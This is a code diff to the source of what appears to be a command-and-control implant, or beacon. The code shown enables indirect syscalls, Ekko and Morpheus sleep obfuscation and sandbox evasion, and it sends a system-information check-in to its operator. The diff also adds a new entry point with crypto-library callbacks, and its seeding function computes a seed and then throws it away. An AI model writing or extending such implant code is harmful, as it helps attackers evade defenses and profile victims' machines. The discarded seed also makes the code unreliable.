@@ -22,8 +22,6 @@
 #include "../include/coff/beacon_compatibility.h"
 #include <cstdint>
 
-extern "C" int __start(void);
-
 /* ============================================================================
  * Initialization Helpers
  * ============================================================================ */
@@ -255,7 +253,7 @@ static bool configureRuntimeFeatures(PandragonRuntime& runtime) {
 
     // Initialize BOF compatibility layer with config
     setBeaconConfig(&runtime.getConfig());
-    g_debugPrint("[__start] BOF compatibility initialized with spawnto config");
+    g_debugPrint("BOF compatibility initialized with spawnto config");
 
     // Layer indirect syscalls if configured
     const BeaconConfig* config_check = &runtime.getConfig();
@@ -263,34 +261,34 @@ static bool configureRuntimeFeatures(PandragonRuntime& runtime) {
         // Set custom pivot if configured
         if (config_check->options.indirect_pivot_set && config_check->indirect_pivot) {
             setSyscallPivot(config_check->indirect_pivot);
-            g_debugPrint("[__start] Custom pivot: %s", config_check->indirect_pivot);
+            g_debugPrint("Custom pivot: %s", config_check->indirect_pivot);
         }
         initSyscallsLayer(runtime.getfuncTable());
-        g_debugPrint("[__start] Indirect syscalls enabled via HWBP");
+        g_debugPrint("Indirect syscalls enabled via HWBP");
     } else {
-        g_debugPrint("[__start] Indirect syscalls: disabled (direct syscalls)");
+        g_debugPrint("Indirect syscalls: disabled (direct syscalls)");
     }
 
     // Configure sleep obfuscation method
     switch (config_check->options.sleep_obfuscation) {
     case 1: runtime.setSleepObfMethod(SleepObfMethod::EKKO);
-            g_debugPrint("[__start] Sleep obfuscation: Ekko enabled");
+            g_debugPrint("Sleep obfuscation: Ekko enabled");
             break;
     case 2: runtime.setSleepObfMethod(SleepObfMethod::MORPHEUS);
-            g_debugPrint("[__start] Sleep obfuscation: Morpheus (WaitOnAddress)");
+            g_debugPrint("Sleep obfuscation: Morpheus (WaitOnAddress)");
             break;
     default: runtime.setSleepObfMethod(SleepObfMethod::NONE);
-            g_debugPrint("[__start] Sleep obfuscation: disabled");
+            g_debugPrint("Sleep obfuscation: disabled");
             break;
     }
 
     // Sandbox evasion
     if (config_check->options.sandbox_evasion) {
         if (checkSandboxEnvironment(runtime.getfuncTable())) {
-            g_debugPrint("[__start] Sandbox detected, exiting");
+            g_debugPrint("Sandbox detected, exiting");
             return false;
         }
-        g_debugPrint("[__start] Sandbox evasion check passed");
+        g_debugPrint("Sandbox evasion check passed");
     }
 
     return true;
@@ -333,10 +331,10 @@ static LoopState setupLoopState(PandragonRuntime& runtime) {
     ls.checkin_sent = false;
     ls.poll_count = 0;
     ls.checkin_target = config->options.lazy_checkin
-        ? ((uint32_t)(___rdtsc() % config->lazy_checkin_max) + 1)
+        ? ((uint32_t)((uint32_t)___rdtsc() % config->lazy_checkin_max) + 1)
         : 1;
 
-    g_debugPrint("[__start] Lazy check-in: %s, target=%lu",
+    g_debugPrint("Lazy check-in: %s, target=%lu",
                  config->options.lazy_checkin ? "enabled" : "disabled",
                  (unsigned long)ls.checkin_target);
 
@@ -414,16 +412,16 @@ static void handleChannelFailover(PandragonRuntime& runtime, LoopState& ls) {
 static void handleLazyCheckin(PandragonRuntime& runtime, LoopState& ls) {
     // Lazy check-in: send system info on or after target poll, never twice
     if (!ls.checkin_sent && ls.poll_count >= ls.checkin_target) {
-        g_VERBOSE("[checkin] poll_count=%u >= target=%lu, sending check-in",
+        g_VERBOSE("poll_count=%u >= target=%lu, sending check-in",
                      (unsigned)ls.poll_count, (unsigned long)ls.checkin_target);
         size_t sysinfo_len = 0;
         char* sysinfo = gatherSystemInfo(&sysinfo_len);
         if (sysinfo && sysinfo_len > 0) {
-            g_debugPrint("[checkin] System info: %zu bytes", sysinfo_len);
+            g_debugPrint("System info: %zu bytes", sysinfo_len);
             (void)runtime.getNetworkManager().sendCheckin(sysinfo, sysinfo_len);
             __free(sysinfo);
         } else {
-            g_debugPrint("[checkin] System info gathering failed, sending bare check-in");
+            g_debugPrint("System info gathering failed, sending bare check-in");
             (void)runtime.getNetworkManager().sendCheckin();
         }
         ls.checkin_sent = true;
@@ -758,7 +756,34 @@ static bool checkAsyncBofWakeupSignals(AsyncBofManager& abm) {
     return has_wakeup_send || has_wakeup_exit;
 }
 
-int __start(void) {
+// HAL callbacks for Bastia
+static void beacon_seed_csprng(const uint8_t* entropy, size_t len) {
+    uint64_t tsc = ___rdtsc();
+    uint64_t seed = tsc;
+    for (size_t i = 0; i < len && i < 8; i++)
+        seed ^= ((uint64_t)entropy[i]) << ((i % 8) * 8);
+    volatile uint64_t _sink = seed;
+    (void)_sink;
+}
+static int  beacon_aes_ni_available(void)                  { return 1; }
+
+extern "C" int
+#ifdef _WIN64
+	__start
+#else
+	_start
+#endif
+(void) {
+    bastia_init(
+    /* genuinely what are we doing */
+        (void* (*)(size_t))__malloc,
+        (void  (*)(void*))__free,
+        (void* (*)(size_t, size_t))__calloc,       
+        (void  (*)(const uint8_t*, size_t))beacon_seed_csprng,
+    	(int   (*)(void))beacon_aes_ni_available,
+        "expand 32-byte k"
+    );
+
 #ifdef DEBUG
     // --subsystem,windows provides no console; allocate one so printf/debugPrint works.
     HMODULE kernel32 = GetModuleBaseAddressA("kernel32.dll");
